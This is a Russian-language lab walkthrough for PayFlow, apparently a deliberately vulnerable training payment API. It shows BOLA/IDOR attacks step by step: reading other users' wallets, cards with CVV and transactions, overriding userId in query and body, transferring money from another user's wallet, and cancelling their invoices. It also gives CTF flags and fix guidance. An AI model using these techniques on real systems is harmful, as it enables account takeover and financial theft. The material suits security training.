BOLA 2 — PayFlow
======================================================================

Что это такое
----------------------------------------------------------------------

BOLA / IDOR — пользователь аутентифицирован, но API не проверяет право
на конкретный объект: кошелёк, транзакцию, карту, счёт.

В BOLA 1 дыра была прямой: GET /notes/{id} отдаёт любую запись.
В PayFlow то же самое, но спрятано глубже — как в реальном финтехе.

Типичные приёмы этой лабы:

  Ложная безопасность
    GET /me/wallets фильтрует «свои». GET /wallets/502 — чужой баланс.

  Query override
    «Мой» профиль, но ?userId=2 подменяет объект.

  Тело POST
    Поиск не смотрит, чей userId вы передали.

  Write BOLA
    Перевод списывает с любого fromWalletId, без проверки владельца.

  List vs item
    Список аудит-логов закрыт (403), отдельная запись по id — открыта.

  Альтернативный ключ
    Кошелёк ищут не только по числу 502, но и по ref вроде WLT-bob8f2a1.


Что вы делаете в лабе
----------------------------------------------------------------------

PayFlow — учебный платёжный API: кошельки, переводы, карты, инвойсы.

Сайт:      http://localhost:3847/bola2
API:       http://localhost:3847/bola2/api/v1
Swagger:   http://localhost:3847/bola2/docs

Пароль страницы и API: portfolio-demo-only

Работать от имени alice (customer), если не сказано иначе.


Как начать
----------------------------------------------------------------------

1. Откройте http://localhost:3847/bola2 (пароль: portfolio-demo-only).
2. Swagger: http://localhost:3847/bola2/docs
3. POST /auth/login:

     {
       "username": "alice",
       "password": "portfolio-demo-only"
     }

4. Скопируйте accessToken → Authorize → Bearer <token>.
5. Задания по порядку через Try it out.

curl:

  curl -s -X POST http://localhost:3847/bola2/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"alice","password":"portfolio-demo-only"}'


Пользователи и объекты
----------------------------------------------------------------------

  username   роль       id
  alice      customer   1     ← вы
  bob        customer   2     ← основная цель
  cafe24     merchant   3
  techshop   merchant   4
  auditor    auditor    5
  admin      admin      6

Кошельки:

  id   ref            владелец   баланс
  501  WLT-alice9k2m  alice      1250 EUR
  502  WLT-bob8f2a1   bob        890.50 EUR
  503  WLT-cafe44x1   cafe24
  504  WLT-tech7p0q   techshop

Карты: 701 — alice, 702 — bob, 703 — techshop.
Инвойсы: 602 — alice (paid), 601 — bob (pending), 603 — techshop + флаг.
Транзакция 9002 (bob → techshop) содержит служебный флаг в internalNote.

Флаги:

  FLAG{BOLA_PAYFLOW_INTERNAL_NOTE}   — internalNote транзакции 9002
  FLAG{BOLA_PAYFLOW_AUDIT_BYPASS}    — audit log id=3
  FLAG{BOLA_PAYFLOW_INVOICE_LEAK}    — items инвойса 603


Задание 1. Вход и свои кошельки
----------------------------------------------------------------------

  GET /me/wallets

Ожидание: у alice один кошелёк, id=501, ref=WLT-alice9k2m, ~1250 EUR.

Это «правильный» список: фильтр по ownerId. Дальше сравнивайте с
прямым доступом по id.


Задание 2. Баланс Bob
----------------------------------------------------------------------

  GET /wallets/502

Ожидание: 200, ownerId=2, balance около 890.50.

Список /me/wallets кошелёк Bob не показал. По id — показал.
Read BOLA на объект кошелька.

Откуда взялся 502: соседние числа (501 свой → 502), Swagger, export.


Задание 3. Профиль Bob через query
----------------------------------------------------------------------

Как узнать про userId: не из JSON профиля. Эндпоинт GET /me/profile
в Swagger объявляет необязательный query-параметр userId (example: 2).
Откройте /bola2/docs → me → GET /me/profile → Parameters.

Без Swagger тот же приём, что в пентесте API:
  — в OpenAPI /bola2/openapi.yaml у /me/profile есть parameters.userId;
  — соседние эндпоинты уже используют имя userId
    (POST /transactions/search, GET /users/{userId}/export);
  — типичные override: ?userId= ?id= ?user= ?accountId=

Запросы:

  GET /me/profile
  GET /me/profile?userId=2

Без параметра — профиль alice.
С userId=2 — профиль bob, хотя токен всё ещё alice.

Это query override: эндпоинт называется «me», но id берётся из query
и не сверяется с текущим пользователем.


Задание 4. Служебное поле чужой транзакции
----------------------------------------------------------------------

Свой кошелёк 501 показывает только операции alice: 9001 и 9003.
Флага там нет — и это ожидаемо: 9003 ваша («Возврат долга» alice → bob).

Чужая — 9002: перевод Bob (кошелёк 502) в TechShop. Её нет в списке 501.

Как найти id:

  1. Соседние числа. Видите 9001 и 9003 → запросите 9002.
  2. Кошелёк Bob уже известен из задания 2:
     GET /wallets/502/transactions
     → в списке 9002 (и входящая 9003).

Итоговый запрос:

  GET /transactions/9002

Ожидание: internalNote содержит
  FLAG{BOLA_PAYFLOW_INTERNAL_NOTE}

Две дыры сразу:
  — BOLA: alice читает операцию Bob по id, хотя в /wallets/501/transactions
    её не было;
  — лишнее поле: internalNote служебное, клиенту его не должны отдавать.

GET /transactions/9004 — то же самое на B2B-переводе мерчантов.


Задание 5. Audit trap: список закрыт, запись открыта
----------------------------------------------------------------------

  GET /audit/logs          → 403 (роль alice = customer)
  GET /audit/logs/3        → 200, флаг FLAG{BOLA_PAYFLOW_AUDIT_BYPASS}

Разработчик закрыл коллекцию по роли и забыл item.
Подсказка часто лежит в теле 403.

Перебор id 1, 2, 3, 4 — нормальный путь, если не знаете номер.


Задание 6. Перевод с кошелька Bob
----------------------------------------------------------------------

  POST /transfers
  {
    "fromWalletId": 502,
    "toWalletId": 501,
    "amount": 10,
    "memo": "BOLA transfer"
  }

Ожидание: 201, баланс Bob уменьшился, alice вырос.

Сервер проверяет, что кошельки существуют и хватает денег.
Владельца fromWalletId не проверяет. Это write BOLA: кража денег.

После опыта нажмите «Сбросить данные» на /bola2 — иначе дальше
цифры балансов поедут.


Задание 7. Поиск чужих транзакций в POST
----------------------------------------------------------------------

  POST /transactions/search
  {
    "userId": 2
  }

Ожидание: все операции кошелька Bob (502).

Фильтр в теле запроса — не право доступа. Сервер должен игнорировать
чужой userId или отвергать его, а не «удобно искать за коллегу».


Задание 8. Кошелёк по ref
----------------------------------------------------------------------

  GET /wallets/by-ref/WLT-bob8f2a1

Ожидание: тот же кошелёк 502.

Закрыть доступ только по числовому id недостаточно.
Любой идентификатор объекта (ref, uuid, slug) — та же проверка владельца.

Ref можно взять из ответа задания 2.


Задание 9. Чужой инвойс и флаг
----------------------------------------------------------------------

  GET /invoices           → только счёт alice (602)
  GET /invoices/603       → счёт techshop, в items флаг
                            FLAG{BOLA_PAYFLOW_INVOICE_LEAK}

Снова list vs item. Свои счета фильтруются, чужой id — нет.
603 можно найти перебором рядом с 601/602.


Задание 10. Полные реквизиты чужой карты
----------------------------------------------------------------------

  GET /cards/702

Ожидание: карта Bob, pan, exp, cvv.

В реальном PCI DSS полный PAN и CVV так не отдают даже владельцу.
Здесь ещё и чужая карта — BOLA + утечка платёжных данных.

Карта alice — 701, логично попробовать 702.


Задание 11. Экспорт Bob
----------------------------------------------------------------------

  GET /users/2/export

Ожидание: профиль bob + кошельки + карты + транзакции + инвойсы.

Агрегированная утечка одним запросом. userId в пути не сверяется
с текущим пользователем.


Задание 12. Отмена чужого инвойса
----------------------------------------------------------------------

  PATCH /invoices/601/status
  {
    "status": "cancelled"
  }

601 — pending-счёт Bob. Ожидание: 200, status=cancelled.

Write BOLA на документ: смена статуса без проверки ownerId.
В проде это «отменить чужой счёт на 5000».

После демо — сброс данных на /bola2.


Дополнительно
----------------------------------------------------------------------

В Swagger есть DELETE /cards/{cardId} и
GET /wallets/{walletId}/transactions — те же IDOR на запись и на
вложенный список. Можно потренироваться на карте 702 и кошельке 502.


Как чинить
----------------------------------------------------------------------

Перед чтением/изменением:

  кошелёк.ownerId === текущий user.id
  карта принадлежит кошельку текущего user
  инвойс.ownerId === текущий user.id
  в переводе fromWallet тоже должен быть свой
  audit item — та же роль, что и на список
  query/body userId нельзя подменять: либо игнорировать, либо 403

Id в URL, query и JSON — не доказательство права.
